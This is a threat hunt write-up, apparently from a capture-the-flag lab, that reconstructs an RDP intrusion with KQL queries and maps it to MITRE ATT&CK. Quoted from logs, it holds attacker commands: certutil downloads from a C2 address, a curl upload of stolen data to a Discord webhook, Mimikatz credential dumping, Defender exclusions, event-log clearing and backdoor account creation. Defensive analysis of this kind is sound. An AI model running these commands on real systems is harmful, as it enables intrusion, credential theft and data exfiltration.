<p align="center">
<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/67e25d1c-f636-49de-9e47-45b5da02070a" />

</p>




# 🛡️ Threat Hunt Report – Port of Entry

---

## 📌 Executive Summary

Investigated a sophisticated cyber intrusion following the discovery that a competitor undercut a 6-year shipping contract by exactly 3%. Investigation revealed that supplier contracts and pricing data had been exfiltrated and appeared on underground forums. 

---

## 🎯 Hunt Objectives

- Detect suspicious activity in endpoint and network data
- Map attacker actions to MITRE ATT&CK framework
- Record findings, blind spots, and ways to improve response

---

## 🧭 Scope & Environment

- **Compromised System:** `azuki-sl` (IT admin workstation) 
- **Data Sources:** Microsoft Sentinel Logs Analytics Workspace
- **Timeframe:** <2025-11-19 → 2025-11-20>  

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 20](#-flag-20)
- [🚨 Detection Recommendations](#-detection-recommendations)
- [🧾 Final Assessment](#-final-assessment)

---

## 🧠 Hunt Overview

The attacker executed a complete attack lifecycle demonstrating advanced persistent threat (APT) characteristics:

- Initial Access: RDP connection from `88.97.178.12` using compromised credentials for user kenji.sato
- Discovery: Network reconnaissance using ARP to enumerate network neighbors
- Defense Evasion: Created hidden staging directory, disabled Windows Defender for key file types and paths
- Execution: Downloaded malware using `certutil.exe`, established C2 communications
- Persistence: Created scheduled task masquerading as 'Windows Update Check'
- Credential Access: Deployed Mimikatz to dump credentials from LSASS memory
- Collection & Exfiltration: Compressed sensitive data and exfiltrated via Discord webhook
- Impact: Cleared Security event logs to hinder investigation
---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | Remote Services | T1021.001 | High |
| 2 | Remote Services | T1021.001 | High |
| 3 | System Network Configuration Discovery | T1016 | Low |
| 4 | Malware Staging Directory | T1074.001 | Medium |
| 5 | Impair Defenses: Disable or Modify Tools | T1562.001 | Medium |
| 6 | Impair Defenses: Disable or Modify Tools | T1562.001 | Medium |
| 7 | Masquerading: Match Legitimate Resource Name or Location | T1036.005 | Low |
| 8 | Scheduled Task/Job: Scheduled Task | T1053.005| Medium |
| 9 | Scheduled Task/Job: Scheduled Task | T1053.005 | Medium |
| 10 | Command and Control | TA0011 | High |
| 11 | Command and Control | TA0011 | High |
| 12 | OS Credential Dumping: LSASS Memory | T1003.001 | CRITICAL |
| 13 | OS Credential Dumping: LSASS Memory | T1003.001 | CRITICAL |
| 14 | Archive Collected Data: Archive via Utility | T1560.001 | Low |
| 15 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | T1567.002 | CRITICAL |
| 16 | Indicator Removal: Clear Windows Event Logs | T1070.001 | Medium |
| 17 | Create Account: Local Account | T1136.001 | High |
| 18 | Command and Scripting Interpreter: PowerShell | T1059.001 | Medium |
| 19 | Lateral Movement | TA0008 | High |
| 20 | Remote Services: Remote Desktop Protocol | T1021.001 | High |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: Remote Services </strong></summary>

### 🎯 Objective
Find the source IP address of the Remote Desktop Protocol Connection 
### 📌 Finding
IP Address of the attacker is 88.97.178.12

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 11/19/2025, 6:36:21.026 PM |
| Process | Remote Desktop Protocol |
| Attacker IP | 88.97.178.12 |

### 💡 Why it matters
RDP connections create network logs that show where unauthorized access came from. Identifying the source helps figure out who the attacker is and stop active attacks.

### 🔧 KQL Query Used
``` kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where LogonType  has "Unlock"
| project TimeGenerated, AccountDomain, AccountName, ActionType, LogonType, RemoteIP, RemoteIPType
```

### 🖼️ Screenshot
<img width="1573" height="871" alt="image" src="https://github.com/user-attachments/assets/f0020aa8-6265-44f0-86cb-d749b4b9b475" />

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: Remote Services</strong></summary>

### 🎯 Objective
Identify the compromised user account that was used for initial access
### 📌 Finding
The user account is kenji.sato
### 🔍 Evidence

| Field | Value |
|------|-------|
| Username | kenji.sato |
| Timestamp | 11/19/2025, 6:36:21.026 PM |
| Process | Remote Desktop Protocol |
| Attacker IP | `88.97.178.12` |

### 💡 Why it matters
Discovering the user account that is compromised can lead us the through the trail of the attack.

### 🔧 KQL Query Used
``` kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where LogonType  has "Unlock"
| project TimeGenerated, AccountDomain, AccountName, ActionType, LogonType, RemoteIP, RemoteIPType

```

### 🖼️ Screenshot
<img width="1573" height="875" alt="image" src="https://github.com/user-attachments/assets/e03c5b5b-bbdb-4677-9b5f-c58c6b411a0c" />

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: Network Reconnaissance</strong></summary>

### 🎯 Objective
Identify the command and argument used to enumerate network neighbours
### 📌 Finding
The command was "ARP.EXE" -a
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:04:01.773 PM |
| Process | `arp.exe` |
| Command | `"ARP.EXE" -a` |

### 💡 Why it matters
Attackers scan networks to find spread paths and critical assets. This reconnaissance signals advanced persistent threats.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "arp"
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1566" height="880" alt="image" src="https://github.com/user-attachments/assets/6e1b67af-4889-491a-8952-39e11a2ec1ab" />

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: Malware Staging Directory</strong></summary>

### 🎯 Objective
Identify the primary staging directory where malware was stored
### 📌 Finding
C:\ProgramData\WindowsCache
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:05:33.766 PM |
| Process | `attrib.exe` |
| Command | `"attrib.exe" +h +s C:\ProgramData\WindowsCache` |
| Directory | `C:\ProgramData\WindowsCache` |

### 💡 Why it matters
Adversaries create staging directories for tool deployment and data aggregation. Locating these paths exposes compromise scope and residual threat artifacts.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "arp"
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1579" height="880" alt="image" src="https://github.com/user-attachments/assets/157d97d5-a8b8-497e-9e28-5664de6fe78c" />

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: File Extension Exclusions</strong></summary>

### 🎯 Objective
Identify the amount of file extensions that were excluded from Windows Defender
### 📌 Finding
3 file extensions were excluded from Windows Defender. The 3 extensions were `.exe`, `.psi`, and `.bat`.
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:05:33.766 PM |
| Extensions Excluded | `.exe`, `.psi`, and `.bat`. |
| Registry Key | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions` |

### 💡 Why it matters
Attackers exclude file types from Windows Defender to avoid detection. The number of exclusions indicates their evasion strategy.


### 🔧 KQL Query Used
``` kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryValueName has "." and RegistryKey has "Extensions"
| project TimeGenerated, ActionType, DeviceName, RegistryValueName, RegistryKey

```

### 🖼️ Screenshot
<img width="1574" height="880" alt="image" src="https://github.com/user-attachments/assets/40d1d7cc-b515-4d78-a2e3-ddfc73123409" />

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: Temporary Folder Exclusion</strong></summary>

### 🎯 Objective
Identify the temporary folder path was excluded from Windows Defender scanning
### 📌 Finding
C:\Users\KENJI~1.SAT\AppData\Local\Temp
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 6:49:27.683 PM |
| Directory | `C:\Users\KENJI~1.SAT\AppData\Local\Temp` |
| Registry Key | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths` |

### 💡 Why it matters
Attackers exclude folders from Windows Defender to avoid detection of directories used for downloading and executing malicious tools. The exclusions let malware run undetected.


### 🔧 KQL Query Used
``` kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryValueName has "." and RegistryKey has "Paths"
| project TimeGenerated, ActionType, DeviceName, RegistryValueName, RegistryKey

```

### 🖼️ Screenshot
<img width="1574" height="879" alt="image" src="https://github.com/user-attachments/assets/7365f225-2e37-411d-9d7d-23fba8a12a41" />

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: Download Utility Abuse</strong></summary>

### 🎯 Objective
Identify the Windows-native binary the attacker abused to download files
### 📌 Finding
certutil.exe
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 6:49:27.683 PM |
| Binary | `certutil.exe` |
| Cmd 1 | `"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe` |
| Cmd 2 | `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` |

### 💡 Why it matters
Attackers weaponize native system tools to download malware undetected. Recognizing these methods improves security controls.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_all ("http", "WindowsCache")
| project TimeGenerated, DeviceName, FileName, FolderPath, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1570" height="880" alt="image" src="https://github.com/user-attachments/assets/83ac78a7-c78a-47e5-8dcc-24db416b35ca" />

</details>

---

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: Scheduled Task Name</strong></summary>

### 🎯 Objective
Identify the name of the scheduled task created for persistence
### 📌 Finding
Windows Update Check
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 6:49:27.683 PM |
| Binary | `schtasks.exe` |
| Cmd 1 | `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` |

### 💡 Why it matters
Scheduled tasks enable persistence through reboots. Task names typically mimic legitimate Windows processes.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_all ("schtasks.exe", "/create")
| project TimeGenerated, DeviceName, FileName, FolderPath, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1570" height="872" alt="image" src="https://github.com/user-attachments/assets/7144cb4b-8787-4d4a-9d79-6ede4a71de7b" />

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: Scheduled Task Target</strong></summary>

### 🎯 Objective
Identify the executable path configured in the scheduled task
### 📌 Finding
C:\ProgramData\WindowsCache\svchost.exe
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 6:49:27.683 PM |
| Binary | `schtasks.exe` |
| Cmd 1 | `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` |

### 💡 Why it matters
Task actions reveal what executes and where malware resides, exposing the persistence method.


### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_all ("schtasks.exe", "/create")
| project TimeGenerated, DeviceName, FileName, FolderPath, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1570" height="872" alt="image" src="https://github.com/user-attachments/assets/7144cb4b-8787-4d4a-9d79-6ede4a71de7b" />

</details>

---

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: C2 Server Address</strong></summary>

### 🎯 Objective
Identify the IP address of the command and control server
### 📌 Finding
`78.141.196.6`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:11:04.176 PM |
| IP Address | `78.141.196.6` |
| ActionType | `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` |

### 💡 Why it matters
Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.

### 🔧 KQL Query Used
``` kql
DeviceNetworkEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessFolderPath contains "WindowsCache"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessFolderPath, RemoteIP, RemotePort, InitiatingProcessCommandLine

```

### 🖼️ Screenshot
<img width="1568" height="881" alt="image" src="https://github.com/user-attachments/assets/9c7b005d-5c2d-455c-953b-f535351d2944" />

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: Communication Port </strong></summary>

### 🎯 Objective
Identify the destination port used for command and control communications
### 📌 Finding
`443`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:11:04.176 PM |
| Port | `443` |
| ActionType | `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` |

### 💡 Why it matters
C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.

### 🔧 KQL Query Used
``` kql
DeviceNetworkEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessFolderPath contains "WindowsCache"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessFolderPath, RemoteIP, RemotePort, InitiatingProcessCommandLine

```

### 🖼️ Screenshot
<img width="1568" height="881" alt="image" src="https://github.com/user-attachments/assets/9c7b005d-5c2d-455c-953b-f535351d2944" />

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: Credential Theft Tool </strong></summary>

### 🎯 Objective
Identify the filename of the credential dumping tool
### 📌 Finding
`mm.exe`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:08:26.280 PM |
| File Name | `mm.exe` |
| Process | `"mm.exe" privilege::debug sekurlsa::logonpasswords exit` |
| Original Name | `"mimikatz` |


### 💡 Why it matters
Credential dumpers extract authentication secrets from memory. Tool renaming evades signature detection. `mm.exe` is infact mimikatz, a well known credential dumping tool.

### 🔧 KQL Query Used
``` kql
DeviceProcessEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains "WindowsCache"
| where FileName contains ".exe"
| project TimeGenerated, DeviceName, FileName, FolderPath, ProcessCommandLine, ProcessVersionInfoOriginalFileName

```

### 🖼️ Screenshot
<img width="1570" height="876" alt="image" src="https://github.com/user-attachments/assets/d76bbdab-3893-4c54-840f-0275193322f4" />

</details>

---

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: Memory Extraction Module </strong></summary>

### 🎯 Objective
Identify the module used to extract logon passwords from memory
### 📌 Finding
`sekurlsa::logonpasswords`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:08:26.280 PM |
| File Name | `mm.exe` |
| Process | `"mm.exe" privilege::debug sekurlsa::logonpasswords exit` |
| Original Name | `"mimikatz` |


### 💡 Why it matters
Credential dumpers leverage specific modules to extract passwords from security subsystems. Documenting techniques improves detection capabilities.

### 🔧 KQL Query Used
``` kql
DeviceProcessEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains "WindowsCache"
| where FileName contains ".exe"
| project TimeGenerated, DeviceName, FileName, FolderPath, ProcessCommandLine, ProcessVersionInfoOriginalFileName

```

### 🖼️ Screenshot
<img width="1570" height="876" alt="image" src="https://github.com/user-attachments/assets/d76bbdab-3893-4c54-840f-0275193322f4" />

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: Data Staging Archive </strong></summary>

### 🎯 Objective
Identify the compressed archive filename used for data exfiltration
### 📌 Finding
`export-data.zip`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:08:58.024 PM |
| File Name | `export-data.zip` |
| Directory | `C:\ProgramData\WindowsCache\export-data.zip` |


### 💡 Why it matters
Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.

### 🔧 KQL Query Used
``` kql
DeviceFileEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains "WindowsCache"
| where FileName contains ".zip"
| project TimeGenerated, DeviceName, FileName, FolderPath

```

### 🖼️ Screenshot
<img width="1568" height="872" alt="image" src="https://github.com/user-attachments/assets/fe1f9ef1-900e-44ae-b723-1d1bff77c9b6" />

</details>

---

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: Exfiltration Channel </strong></summary>

### 🎯 Objective
Identify the cloud service used to exfiltrate stolen data
### 📌 Finding
Discord was the service used to exfiltrate data
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:08:58.024 PM |
| File Name | `export-data.zip` |
| Process | `"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8` |


### 💡 Why it matters
Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.

### 🔧 KQL Query Used
``` kql
DeviceNetworkEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RemotePort == "443"
| where InitiatingProcessCommandLine contains "WindowsCache"
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemotePort, RemoteUrl

```

### 🖼️ Screenshot
<img width="1572" height="885" alt="image" src="https://github.com/user-attachments/assets/d84de321-b99e-444c-b477-86e14705fce4" />

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: Log Tampering </strong></summary>

### 🎯 Objective
Identify the first Windows event log cleared by the attacker 
### 📌 Finding
The Security event log was the first to be cleared
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:11:39.093 PM |
| Event Type | `Security` |
| Process | `"wevtutil.exe" cl Security` |


### 💡 Why it matters
Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.

### 🔧 KQL Query Used
``` kql
DeviceProcessEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName contains "wevtutil.exe"
| where ProcessCommandLine contains "cl "
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1576" height="876" alt="image" src="https://github.com/user-attachments/assets/ff7935ec-73e0-4e78-81b0-257354115d0f" />

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: Persistence Account </strong></summary>

### 🎯 Objective
Identify the backdoor account username created by the attacker
### 📌 Finding
The hidden administrator account is named `support`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:11:39.093 PM |
| Account | `support` |
| Process | `"net.exe" user support ********** /add` |


### 💡 Why it matters
Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.

### 🔧 KQL Query Used
``` kql
DeviceProcessEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_all ("net", "user")
| project TimeGenerated, DeviceName, ProcessCommandLine

```

### 🖼️ Screenshot
<img width="1573" height="872" alt="image" src="https://github.com/user-attachments/assets/38c717b1-d480-4ded-bada-8f23a11195ba" />

</details>

---

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: Malicious Script </strong></summary>

### 🎯 Objective
Identify the PowerShell script file used to automate the attack chain 
### 📌 Finding
The PowerShell script file is `wupdate.ps1`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:05:30.755 PM |
| Script | `wupdate.ps1` |
| Process | `"powershell.exe" -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1` |


### 💡 Why it matters
Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.

### 🔧 KQL Query Used
``` kql
DeviceFileEvents 
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains "WindowsCache"
| where InitiatingProcessCommandLine has ".ps1"
| project TimeGenerated, DeviceName, FolderPath, FileName, InitiatingProcessCommandLine

```

### 🖼️ Screenshot
<img width="1577" height="884" alt="image" src="https://github.com/user-attachments/assets/516d4da0-b503-4d31-a68a-466effba29cd" />

</details>

---

<details>
<summary id="-flag-19">🚩 <strong>Flag 19: Secondary Target </strong></summary>

### 🎯 Objective
Identify the secondary IP address that was targeted for lateral movement
### 📌 Finding
The second IP address is `10.1.0.188`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:05:30.755 PM |
| IP Address | `10.1.0.188` |
| Process | `"mstsc.exe" /v:10.1.0.188` |


### 💡 Why it matters
Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.

### 🔧 KQL Query Used
``` kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessCommandLine has_any ("cmdkey", "mstsc")
| project TimeGenerated, ActionType, InitiatingProcessCommandLine

```

### 🖼️ Screenshot
<img width="1573" height="891" alt="image" src="https://github.com/user-attachments/assets/3fdb83ae-5db2-467f-aed9-e850d9d3e894" />

</details>

---

<details>
<summary id="-flag-20">🚩 <strong>Flag 20: Remote Access Tool </strong></summary>

### 🎯 Objective
Identify the remote access tool used for lateral movement
### 📌 Finding
The RAT used for lateral movement is `mstsc.exe`
### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 11/19/2025, 7:11:39.093 PM |
| RAT | `mstsc.exe` |
| Process | `"mstsc.exe" /v:10.1.0.188` |


### 💡 Why it matters
Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.

### 🔧 KQL Query Used
``` kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains ("10.1.0.188")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, ProcessVersionInfoFileDescription

```

### 🖼️ Screenshot
<img width="1572" height="868" alt="image" src="https://github.com/user-attachments/assets/39badd97-996a-4ffc-b233-a7b07eca3c3a" />

</details>

---

<summary id="#-detection-recommendations"> ## 🚨 Detection Recommendations </summary>

### Recommendations
- Implement MFA for all RDP connections
- Deploy LSASS protection (Credential Guard, PPL)
- Monitor `certutil.exe` usage for download activities
- Alert on Windows Defender exclusion changes
- Block Discord webhooks at the web proxy

---

<summary id="#-final-assessment"> ## 🧾 Final Assessment </summary>

- This intrusion demonstrates a methodical, multi-stage attack executed by a skilled adversary with clear objectives. The attacker successfully compromised an IT administrator workstation, established persistence, stole credentials, and exfiltrated sensitive business data while attempting to cover their tracks.
- The attack leveraged legitimate system tools (certutil, schtasks), disabled security controls, and used cloud services for exfiltration; all techniques designed to evade traditional security controls. The mapping to MITRE ATT&CK framework reveals coverage across multiple tactics from Initial Access through Impact, indicating a comprehensive understanding of enterprise security environments.
- Immediate remediation is required, followed by systematic improvements to detection capabilities, access controls, and network segmentation to prevent similar incidents in the future.
---
